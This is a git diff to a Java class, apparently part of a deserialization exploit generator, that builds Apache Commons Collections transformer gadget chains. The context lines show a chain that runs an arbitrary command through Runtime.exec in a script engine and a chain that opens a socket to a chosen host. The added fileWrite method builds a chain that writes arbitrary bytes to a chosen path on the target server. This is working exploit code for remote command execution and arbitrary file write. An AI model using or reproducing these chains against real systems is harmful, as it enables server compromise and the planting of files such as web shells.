@@ -9,6 +9,8 @@ import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 
 import javax.script.ScriptEngineManager;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.net.Socket;
 
 /**
@@ -83,8 +85,8 @@ public class InvokerTransformer3 {
     @EnchantType({EnchantType.ScriptEngine})
     public Transformer[] scriptEngine(SinksHelper sinksHelper) {
         String command = sinksHelper.getCommand();
-        String code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
 
+        String code = String.format("java.lang.Runtime.getRuntime().exec(\"%s\")", command);
         return new Transformer[]{
                 new ConstantTransformer(ScriptEngineManager.class),
                 new InstantiateTransformer(new Class[]{}, new Object[]{}),
@@ -106,16 +108,45 @@ public class InvokerTransformer3 {
         String thost = sinksHelper.getHost();
 
         String[] hostSplit = thost.split("[:]");
-
         String host = hostSplit[0];
         int port = 80;
-
         if (hostSplit.length == 2)
             port = Integer.parseInt(hostSplit[1]);
 
         return new Transformer[]{
                 new ConstantTransformer(Socket.class),
                 new InstantiateTransformer(new Class[]{String.class, int.class}, new Object[]{host, port}),
+                new ConstantTransformer(1)};
+    }
+
+    @EnchantType({EnchantType.FileWrite})
+    public Transformer[] fileWrite(SinksHelper sinksHelper) throws Exception {
+        String serverFilePath = sinksHelper.getServerFilePath();
+        String localFilePath = sinksHelper.getLocalFilePath();
+        String fileContent = sinksHelper.getFileContent();
+
+        byte[] contentBytes = new byte[]{};
+
+        if (localFilePath != null) {
+            try {
+                FileInputStream fileInputStream = new FileInputStream(localFilePath);
+                contentBytes = new byte[fileInputStream.available()];
+                fileInputStream.read(contentBytes);
+                fileInputStream.close();
+            } catch (Exception e) {
+                Printer.error("File read error");
+            }
+        } else if (fileContent != null) {
+            contentBytes = fileContent.getBytes();
+        }
+
+        return new Transformer[]{
+                new ConstantTransformer(FileOutputStream.class),
+                new InstantiateTransformer(
+                        new Class[]{String.class},
+                        new Object[]{serverFilePath}
+                ),
+                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{contentBytes}),
                 new ConstantTransformer(1)};
     }
 
